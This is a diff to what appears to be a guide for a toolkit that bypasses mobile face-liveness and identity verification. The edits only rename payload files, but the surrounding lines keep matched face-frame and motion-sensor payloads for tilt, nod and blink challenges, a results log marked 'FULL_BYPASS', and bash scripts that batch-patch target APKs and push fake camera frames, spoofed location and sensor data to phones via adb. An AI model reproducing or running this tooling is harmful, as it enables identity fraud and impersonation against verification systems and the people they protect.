@@ -89,8 +89,8 @@ Payloads -- face frames, location configs, sensor profiles -- are the raw materi
     holding.json       For selfie/face scans (slight tremor)
     still.json         Phone on table (zero motion)
     walking.json       Step-like pattern
-    tilt_left.json     Matches face tilt_left frames
-    tilt_right.json    Matches face tilt_right frames
+    tilt-left.json     Matches face tilt_left frames
+    tilt-right.json    Matches face tilt_right frames
     nod.json           Matches face nod frames
 ```
 
@@ -117,8 +117,8 @@ Build and deploy payloads as matched pairs:
 | Camera Sequence | Sensor Config | Use Case |
 |----------------|---------------|----------|
 | `neutral/` | `holding.json` | Static face scan, passive liveness |
-| `tilt_left/` | `tilt_left.json` | "Tilt left" active liveness challenge |
-| `tilt_right/` | `tilt_right.json` | "Tilt right" active liveness challenge |
+| `tilt_left/` | `tilt-left.json` | "Tilt left" active liveness challenge |
+| `tilt_right/` | `tilt-right.json` | "Tilt right" active liveness challenge |
 | `nod/` | `nod.json` | "Nod" active liveness challenge |
 | `blink/` | `holding.json` | "Blink" challenge (facial only, no device motion) |
 
@@ -211,8 +211,8 @@ evasion_applied:
 # Payloads that worked
 payloads_used:
   frames: "male_caucasian_30s/neutral + tilt_left + nod"
-  location: "nyc_midtown.json"
-  sensors: "holding.json + tilt_left.json + nod.json"
+  location: "times-square.json"
+  sensors: "holding.json + tilt-left.json + nod.json"
 
 # Outcome
 result: FULL_BYPASS
@@ -267,7 +267,7 @@ The scripts in this section automate the three phases of a multi-target engageme
 
 ### Patch All Targets
 
-Place all target APKs in a directory and patch them in a single pass:
+Place all target APKs in a directory and patch them in a single pass. The materials kit includes starter scripts at `materials/scripts/batch-patch.sh` and `materials/scripts/batch-deploy.sh` — adapt them for your engagements or use the expanded versions below:
 
 ```bash
 #!/bin/bash
@@ -319,7 +319,7 @@ set -uo pipefail
 PATCHED_DIR="./patched"
 REPORTS_DIR="./reports"
 PAYLOAD_FRAMES="$HOME/payloads/faces/male_caucasian_30s/neutral"
-PAYLOAD_LOCATION="$HOME/payloads/locations/us_east/nyc_midtown.json"
+PAYLOAD_LOCATION="$HOME/payloads/locations/times-square.json"
 PAYLOAD_SENSOR="$HOME/payloads/sensors/holding.json"
 
 mkdir -p "$REPORTS_DIR"
@@ -483,7 +483,7 @@ deploy_to_device() {
     adb -s "$device" shell appops set "$PKG" MANAGE_EXTERNAL_STORAGE allow 2>/dev/null
 
     adb -s "$device" push "$PAYLOAD_DIR/faces/male_caucasian_30s/neutral"/. /sdcard/poc_frames/
-    adb -s "$device" push "$PAYLOAD_DIR/locations/us_east/nyc_midtown.json" /sdcard/poc_location/config.json
+    adb -s "$device" push "$PAYLOAD_DIR/locations/times-square.json" /sdcard/poc_location/config.json
     adb -s "$device" push "$PAYLOAD_DIR/sensors/holding.json" /sdcard/poc_sensor/config.json
 
     adb -s "$device" logcat -c
